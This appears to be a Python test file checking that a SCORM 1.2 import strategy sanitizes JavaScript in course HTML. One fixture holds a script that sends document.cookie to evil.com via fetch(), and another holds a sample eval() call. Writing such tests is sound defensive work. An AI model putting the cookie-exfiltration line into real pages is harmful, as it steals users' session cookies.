"""Test JS sanitization in SCORM import strategy."""

import io
import zipfile
from app.services.import_strategies.scorm12_strategy import Scorm12Strategy


def create_test_scorm_package(html_content: str) -> bytes:
    """Create minimal SCORM 1.2 package with given HTML content."""
    manifest_xml = """<?xml version="1.0"?>
<manifest xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2">
  <organizations>
    <organization identifier="org1">
      <title>Test Course</title>
      <item identifier="item1" identifierref="res1">
        <title>Test Page</title>
      </item>
    </organization>
  </organizations>
  <resources>
    <resource identifier="res1" href="page.html" type="webcontent"/>
  </resources>
</manifest>"""
    
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("imsmanifest.xml", manifest_xml)
        zf.writestr("page.html", html_content)
    return buf.getvalue()


class TestScormJSSanitization:
    """Test JavaScript sanitization during SCORM import."""
    
    async def test_sanitize_dangerous_fetch(self):
        """Should sanitize fetch() calls."""
        html = """<!DOCTYPE html>
<html>
<head><title>Test</title></head>
<body>
<script>
function checkAnswer() {
    fetch('https://evil.com/steal?data=' + document.cookie);
    console.log('Answer checked');
}
</script>
<button onclick="checkAnswer()">Check</button>
</body>
</html>"""
        
        zip_bytes = create_test_scorm_package(html)
        strategy = Scorm12Strategy()
        
        result = await strategy.analyze(zip_bytes, ["imsmanifest.xml"])
        
        assert result.course_data is not None
        templates = result.course_data.get("templates", [])
        assert len(templates) == 1
        
        content = templates[0]["data"]["content"]
        # Dangerous fetch should be removed or commented
        assert "fetch(" not in content or "// REMOVED:" in content
    
    async def test_preserve_safe_dom_manipulation(self):
        """Should preserve safe DOM manipulation."""
        html = """<!DOCTYPE html>
<html>
<body>
<script>
function showResult() {
    var elem = document.getElementById('result');
    elem.textContent = 'Correct!';
    elem.classList.add('success');
}
</script>
</body>
</html>"""
        
        zip_bytes = create_test_scorm_package(html)
        strategy = Scorm12Strategy()
        
        result = await strategy.analyze(zip_bytes, ["imsmanifest.xml"])
        
        templates = result.course_data.get("templates", [])
        content = templates[0]["data"]["content"]
        
        # Safe operations should be preserved
        assert "textContent" in content
        assert "classList" in content
        assert "getElementById" in content
    
    async def test_medium_risk_gets_warning(self):
        """Medium risk scripts should get warning comments."""
        html = """<!DOCTYPE html>
<html>
<body>
<script>
function updateDisplay() {
    // Uses eval() which is medium-high risk
    var code = "document.getElementById('test').innerHTML = 'Updated'";
    eval(code);
}
</script>
</body>
</html>"""
        
        zip_bytes = create_test_scorm_package(html)
        strategy = Scorm12Strategy()
        
        result = await strategy.analyze(zip_bytes, ["imsmanifest.xml"])
        
        templates = result.course_data.get("templates", [])
        content = templates[0]["data"]["content"]
        
        # Should have warning comment or sanitization
        assert (
            "SECURITY WARNING" in content
            or "// REMOVED:" in content
            or "eval" not in content
        )
